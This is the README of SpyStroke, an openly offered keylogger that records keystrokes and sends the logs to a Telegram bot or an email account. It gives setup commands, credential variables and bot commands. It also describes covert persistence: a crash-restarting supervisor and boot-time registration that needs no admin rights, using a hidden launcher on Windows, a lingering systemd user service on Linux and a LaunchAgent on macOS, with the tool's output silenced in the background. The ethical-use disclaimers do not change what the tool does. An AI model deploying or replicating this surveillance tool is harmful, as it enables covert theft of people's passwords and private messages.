# SpyStroke: Advanced Keylogger with Telegram & Email Integration

[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fanishalx%2FSpyStroke.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2Fanishalx%2FSpyStroke?ref=badge_shield)

**SpyStroke** captures keystrokes and delivers logs to your **Telegram bot** or by
**email**. Designed for ethical research, cybersecurity testing on systems you own,
and educational purposes.

> [!WARNING]
> This tool is intended for **educational and ethical use only** — use it only on
> devices you own or have explicit permission to monitor. The author is not
> responsible for any misuse. Comply with all relevant laws.

---

## 🚀 Features

- **Robust keystroke capture** — correct handling of special keys (`Ctrl`, `Shift`,
  `Alt`, arrows, function keys, media keys, …); a single unknown key can never crash
  the logger.
- **Thread-safe buffering** — keystrokes are collected in a lock-protected buffer and
  drained on a fixed schedule; no race conditions between the keyboard thread and the
  reporter.
- **Reliable delivery** — automatic retries with exponential backoff for network
  hiccups, respect for Telegram rate limits, fail-fast on configuration errors, and
  automatic chunking of messages over Telegram's 4096-character limit.
- **No hardcoded secrets** — all credentials come from environment variables or a
  `.env` file.
- **Graceful shutdown** — `/exit`, `Ctrl+C` and signals cleanly stop the listener and
  reporter (no `os._exit`).
- **Cross-platform** — Windows, macOS, Linux.
- **Fully unit-tested** — 64 tests covering key formatting, concurrency, config
  parsing and both delivery channels.

---

## 📁 Project structure

```
spystroke/                # shared engine (used by both entry points)
├── core.py               # key formatting + thread-safe keystroke buffer + listener
├── config.py             # environment-based configuration
├── telegram_reporter.py  # async Telegram delivery with retry/backoff/chunking
├── email_reporter.py     # SMTP delivery with retry/backoff
├── supervisor.py         # process watchdog: restart on crash, CLI (run/install/status)
└── autostart.py          # per-user boot registration (Windows / systemd / launchd)
telegram/
└── bot.py                # Telegram bot entry point (commands below)
email/
├── keylogger.py          # email keylogger wrapper (Keylogger class)
└── main.py               # email entry point
tests/                    # pytest suite
```

## 🛠 Installation

```bash
# 1. Clone and enter the repository
git clone https://github.com/anishalx/SpyStroke.git
cd SpyStroke

# 2. (Recommended) create a virtual environment
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Configure credentials (see below)
cp .env.example .env             # then edit .env with your values
```

## ⚙️ Configuration

All settings are read from environment variables or a `.env` file in the project
root (a `.env.example` template is included). **Never commit your `.env`.**

| Variable | Default | Used by | Description |
|---|---|---|---|
| `SPYSTROKE_BOT_TOKEN` | – | Telegram | Bot token from [@BotFather](https://t.me/BotFather) |
| `SPYSTROKE_CHAT_ID` | – | Telegram | Chat ID for log delivery (from [@userinfobot](https://t.me/userinfobot)) |
| `SPYSTROKE_EMAIL` | – | Email | Sender address |
| `SPYSTROKE_EMAIL_PASSWORD` | – | Email | SMTP password — Gmail requires an [app password](https://support.google.com/accounts/answer/185833) |
| `SPYSTROKE_RECEIVER` | sender | Email | Optional different recipient |
| `SPYSTROKE_INTERVAL` | `10` (TG) / `120` (email) | both | Seconds between reports |
| `SPYSTROKE_SMTP_HOST` | `smtp.gmail.com` | Email | SMTP server |
| `SPYSTROKE_SMTP_PORT` | `587` | Email | SMTP port |
| `SPYSTROKE_SMTP_TLS` | `1` | Email | `1` = STARTTLS, `0` = implicit TLS |
| `SPYSTROKE_SILENT` | `0` | both | `1` suppresses console output |
| `SPYSTROKE_LOG_FILE` | – | both | Optional file for logs |

## 📨 Telegram delivery

1. Create a bot with [@BotFather](https://t.me/BotFather) and get its token.
2. Get your chat ID from [@userinfobot](https://t.me/userinfobot).
3. Set `SPYSTROKE_BOT_TOKEN` and `SPYSTROKE_CHAT_ID` in `.env`.
4. Start the bot:

```bash
python telegram/bot.py
```

### Bot commands

| Command | Action |
|---|---|
| `/start` | Show help |
| `/key_logger` | Start capturing keystrokes and reporting them |
| `/stop` | Stop capturing (bot stays online) |
| `/status` | Show whether the keylogger is running and buffered size |
| `/exit` | Stop everything and shut the bot down |

## ✉️ Email delivery

```bash
export SPYSTROKE_EMAIL=you@gmail.com
export SPYSTROKE_EMAIL_PASSWORD=your-app-password
python email/main.py
```

For direct scripting use, the original `Keylogger` class is preserved:

```python
from email.keylogger import Keylogger

kl = Keylogger(120, "you@gmail.com", "your-app-password")
kl.start()
```

## 🧪 Testing

```bash
pip install -r requirements.txt   # includes pytest
python -m pytest tests/ -v
```

## 🔄 Auto-start & process persistence

The included **supervisor** keeps the bot alive: it runs the bot as a child
process and automatically restarts it if it crashes (with exponential backoff
so a crash loop can't hammer the system). It can also register the bot to
start automatically when the machine boots — **per user, no admin rights
needed**.

```bash
# Run the Telegram bot under supervision (foreground)
python -m spystroke.supervisor run telegram

# Register the bot to start automatically at boot
python -m spystroke.supervisor install telegram

# Check what is running / registered
python -m spystroke.supervisor status

# Remove the boot registration (bot keeps running until stopped)
python -m spystroke.supervisor uninstall telegram
```

Replace `telegram` with `email` for the email entry point.

> [!IMPORTANT]
> `run` and `install` print the legal disclaimer and require you to type
> `yes` to confirm you are authorized to monitor the device before anything
> starts. In non-interactive contexts (CI, scripts, pipes) the command
> aborts unless you pass `--yes` explicitly, e.g.
> `python -m spystroke.supervisor install telegram --yes` — consent is
> never assumed.

How boot registration works per platform (all user-level, no admin):

| Platform | Mechanism | Artifact |
|---|---|---|
| Windows | Startup folder + hidden `pythonw` launcher | `%APPDATA%\...\Startup\spystroke-<name>.vbs` |
| Linux | systemd *user* service (with `Restart=always`; linger enabled so it runs before login) | `~/.config/systemd/user/spystroke-<name>.service` |
| macOS | launchd LaunchAgent (`RunAtLoad` + `KeepAlive`) | `~/Library/LaunchAgents/com.spystroke.<name>.plist` |

Supervisor state (pid files, logs) lives in `~/.spystroke/`. The supervisor
redirects the bot's output to `spystroke-<name>.log` there, so the bot stays
silent in the background. Stopping the supervisor (Ctrl+C, or a signal)
gracefully stops the child bot first.

> [!NOTE]
> Auto-start requires the `.env` / environment configuration to be in place
> **before** boot registration, otherwise the bot will fail validation on
> startup and the supervisor will keep retrying with backoff.

## 🔒 Security notes

- Credentials are read from the environment, never hardcoded.
- Delivery failures are logged and retried with backoff; authentication and
  configuration errors fail fast instead of retrying forever.
- The listener catches and logs every key event defensively — one malformed key
  cannot take down the logger.

## 📄 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file.

## 📢 Support and Feedback

For issues or suggestions, open a **GitHub issue** or contact the author via
[email](mailto:s7vdi6a8l@mozmail.com).
